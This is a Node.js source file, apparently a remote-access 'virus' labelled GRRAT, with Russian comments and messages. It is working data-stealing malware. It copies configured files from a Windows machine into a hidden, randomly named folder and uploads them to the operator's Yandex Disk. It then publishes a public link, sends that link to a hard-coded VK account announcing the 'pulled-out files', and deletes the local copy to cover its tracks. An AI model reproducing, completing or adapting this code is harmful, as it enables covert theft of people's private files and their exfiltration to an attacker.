

const { VKApi, ConsoleLogger, BotsLongPollUpdatesProvider } = require('node-vk-sdk')
const fs = require("fs-extra")
const YandexDisk = require('yandex-disk').YandexDisk;
var disk = new YandexDisk(conf.yandex.login, conf.yandex.password); // доступ по логину и паролю
fs.exists("./config.json", exist => {
    if (exist) {
        fs.exists("../ratvirus", existfolder => {
            console.log(`${exist}       ||      ${existfolder}`)
            if (existfolder) {
                let newactconf = { ownerid: 312888294 }
                let newconf = require("./config.json")
                ratcore.init({ conf: newconf, actconf: newactconf })
            } else {
                ratcore.init({ conf: conf, actconf: actconf })
            }
        })
    } else {
        ratcore.init({ conf: conf, actconf: actconf })
    }
})
const api = new VKApi({
    token: conf.group.token,
    logger: new ConsoleLogger()
})
let updatesProvider = new BotsLongPollUpdatesProvider(api, conf.group.id)
updatesProvider.getUpdates(updates => { })
const ratcore = {}
ratcore.init = function start(temp) {
    let conf = temp.conf
    disk.exists("GRRAT", exist => {
        new Promise(function (resolve) {
            if (!exist) {
                disk.mkdir("GRRAT", err => {
                    if (err) {
                        console.error(err)
                    }
                    resolve(true)
                })
            }

        }).then(() => {
            disk.exists(`GRRAT/${conf.name}`, exist => {
                new Promise(function (resolve) {
                    if (!exist) {
                        disk.mkdir(`GRRAT/${conf.name}`, err => {
                            if (err) { console.error(err) }
                            resolve(true)
                        })
                    }
                }).then(ratcore.startvirus(temp))
            })
        })
    })
}
ratcore.startvirus = function (temp) {
    let conf = temp.conf
    let actconf = temp.actconf
    let needfiles = conf.files.length
    let nonfinedfiles = "Отсутствующие файлы:\n"
    let randomname = function makeid(length) {
        var result = '';
        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }
    if (needfiles != 0) {
        let randomn = randomname(6)
        let secretfolder = "C:/Users/" + randomn
        fs.mkdir(secretfolder, (err) => {
            if (err != null) {
                if (err.code == "EPERM") {
                    console.log("Перезапустите программу, от имени администратора!")
                }
            } else {
                new Promise(function (resolve) {
                    for (let index = 0; index < needfiles; index++) {
                        fs.exists(conf.files[index], isexist => {
                            let lastname = conf.files[index].split("/")
                            lastname = lastname[lastname.length - 1]
                            if (isexist) {
                                fs.copy(conf.files[index], secretfolder + `/${lastname}`)
                            } else {
                                nonfinedfiles = nonfinedfiles + conf.files[index] + "\n"
                            }
                        })
                        if (index >= needfiles - 1) {
                            resolve(true)
                        }
                    }
                }).then(() => {
                    fs.writeFile(secretfolder + "/nonfinedfiles.txt", nonfinedfiles, err => {
                        if (err == null) {
                            disk.uploadDir(secretfolder, `GRRAT/${conf.name}/${randomn}`, err => {
                                if (err == null) {
                                    disk.isPublic(`GRRAT/${conf.name}/${randomn}`, (err, result) => {
                                        if (err == null) {
                                            if (result == null) {
                                                disk.publish(`GRRAT/${conf.name}/${randomn}`, (err, url) => {
                                                    if (err == null) {
                                                        let randomint = Math.random()
                                                        api.messagesSend({
                                                            user_id: actconf.ownerid,
                                                            peer_id: actconf.ownerid,
                                                            random_id: randomint,
                                                            message: `Был произведён запуск!\nВот ссылка на вытащенные файлы / каталоги: ${url}`
                                                        })
                                                        fs.remove(secretfolder, err => { })
                                                    }
                                                })
                                            }
                                        }
                                    })
                                }
                            })
                        }
                    })
                })
            }

        })

    } else {

    }
}